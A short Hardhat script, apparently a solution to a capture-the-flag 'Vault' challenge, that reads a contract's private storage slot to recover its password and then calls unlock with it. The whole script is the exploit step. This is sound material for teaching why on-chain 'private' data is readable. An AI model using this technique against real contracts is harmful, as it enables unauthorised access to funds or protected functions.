import { ethers } from "hardhat";

async function main() {
  const vault = await ethers.getContractAt("Vault", "0x1fAB39c4d4d46F5036e02f7D5E6BF1482A70200f");

  const password = await ethers.provider.getStorageAt(vault.address, 1);
  const tx = await vault.unlock(password);
  await tx.wait(1);

  console.log("done!");
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
